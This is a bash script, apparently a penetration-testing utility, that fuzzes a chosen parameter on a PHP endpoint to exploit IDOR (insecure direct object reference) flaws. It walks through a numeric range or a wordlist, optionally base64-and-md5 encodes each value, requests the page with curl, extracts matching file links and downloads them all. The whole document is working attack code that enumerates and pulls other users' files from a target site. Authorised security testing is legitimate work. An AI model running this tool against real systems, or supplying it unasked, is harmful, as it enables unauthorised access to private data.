#!/bin/bash

# **Define the base URL**
echo "Please enter URL you want to test for IDOR"
read url

# **Select HTTP Method**
echo "Select HTTP method: GET or POST"
read method

# **Directory to Search**
echo "Enter directory to search (e.g., 'uploads', omit the forward slash '/'): "
read directory

# **Parameter to Fuzz**
echo "Enter parameter name to fuzz (e.g., 'uid', omit the equals '='): "
read parameter

# **Convert Method to Uppercase**
method=${method^^}

# **Range or File List**
echo "Do you want to use a range (R) or a file list (F)? Enter R or F:"
read choice

# **Encoding Option**
echo "Do you want to encode parameter values? (Y/N)"
read encode

if [ "$choice" = "R" ] || [ "$choice" = "r" ]; then
    echo "Enter the start of the range:"
    read start
    echo "Enter the end of the range:"
    read end

    for i in $(seq $start $end); do
        # **Encoding Check**
        if [ "$encode" = "Y" ] || [ "$encode" = "y" ]; then
            encoded_i=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
            param_value=$encoded_i
        else
            param_value=$i
        fi

        # **HTTP Method Check**
        if [ "$method" == "GET" ]; then
            response=$(curl -s "$url/$directory.php?$parameter=$param_value")
        elif [ "$method" == "POST" ]; then
            response=$(curl -s -X POST --data "$parameter=$param_value" "$url/$directory.php")
        else
            echo "Invalid HTTP method selected."
            exit 1
        fi

        # **Extract and Download Links**
        links=$(echo "$response" | grep -oP "/$directory.*?\.\w+")
        for link in $links; do
            complete_url="${url}${link}"
            echo "Downloading: $complete_url"
            curl -s -O "$complete_url"
        done
    done

elif [ "$choice" = "F" ] || [ "$choice" = "f" ]; then
    echo "Enter the path to the file containing the list:"
    read -e -p "> " listPath

    while IFS= read -r line; do
        i=$line
        # **Encoding Check**
        if [ "$encode" = "Y" ] || [ "$encode" = "y" ]; then
            encoded_i=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
            param_value=$encoded_i
        else
            param_value=$i
        fi

        # **HTTP Method Check**
        if [ "$method" == "GET" ]; then
            response=$(curl -s "$url/$directory.php?$parameter=$param_value")
        elif [ "$method" == "POST" ]; then
            response=$(curl -s -X POST --data "$parameter=$param_value" "$url/$directory.php")
        else
            echo "Invalid HTTP method selected."
            exit 1
        fi

        # **Extract and Download Links**
        links=$(echo "$response" | grep -oP "/$directory.*?\.\w+")
        for link in $links; do
            complete_url="${url}${link}"
            echo "Downloading: $complete_url"
            curl -s -O "$complete_url"
        done
    done < "$listPath"

else
    echo "Invalid choice. Exiting."
    exit 1
fi

